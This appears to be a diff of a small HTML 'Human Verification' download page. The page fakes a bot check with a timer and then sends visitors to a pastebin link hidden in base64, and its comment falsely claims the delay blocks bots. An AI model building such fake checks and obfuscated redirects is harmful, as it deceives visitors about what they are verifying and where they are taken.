@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Download Verification</title>
+  <title>Secure Download</title>
   <style>
     body {
-      background-color: #111;
-      color: #fff;
+      background-color: #1a1a1a;
+      color: white;
       text-align: center;
       font-family: Arial, sans-serif;
-      margin-top: 100px;
+      padding-top: 100px;
     }
     button {
       padding: 15px 30px;
-      background-color: #22c55e;
+      background-color: #4ade80;
       color: white;
       font-size: 18px;
       border: none;
@@ -21,32 +21,29 @@
     }
   </style>
   <script>
-    let verified = false;
+    let isVerified = false;
 
-    function startVerification() {
-      document.getElementById("msg").innerText = "Verifying you're not a bot...";
+    function verifyUser() {
+      document.getElementById("status").innerText = "Verifying you're human...";
       setTimeout(() => {
-        verified = true;
-        document.getElementById("msg").innerText = "✅ Verified! Click below to continue.";
-        document.getElementById("dlbtn").style.display = "inline-block";
-      }, 7000); // 7 seconds delay
+        isVerified = true;
+        document.getElementById("status").innerText = "✅ Verification complete!";
+        document.getElementById("downloadBtn").style.display = "inline-block";
+      }, 6000); // 6 seconds delay to block bots
     }
 
-    function continueToDownload() {
-      if (!verified) return;
-      // Final protected link
-      const url = atob("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vVDViNnFDVjc=");
-      window.location.href = url;
+    function goToLink() {
+      if (!isVerified) return;
+      const finalLink = atob("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vVDViNnFDVjc=");
+      window.location.href = finalLink;
     }
   </script>
 </head>
 <body>
-  <h1>🔒 Human Verification</h1>
-  <p>Please click the button and wait a few seconds to verify.</p>
-  <button onclick="startVerification()">Start Verification</button>
-  <p id="msg" style="margin: 20px;"></p>
-  <button id="dlbtn" onclick="continueToDownload()" style="display:none;">Continue to Download</button>
+  <h1>🔐 Human Verification</h1>
+  <p>Click the button below and wait a few seconds to continue.</p>
+  <button onclick="verifyUser()">Start Verification</button>
+  <p id="status" style="margin: 20px;"></p>
+  <button id="downloadBtn" onclick="goToLink()" style="display:none;">Continue to Download</button>
 </body>
 </html>
-
-
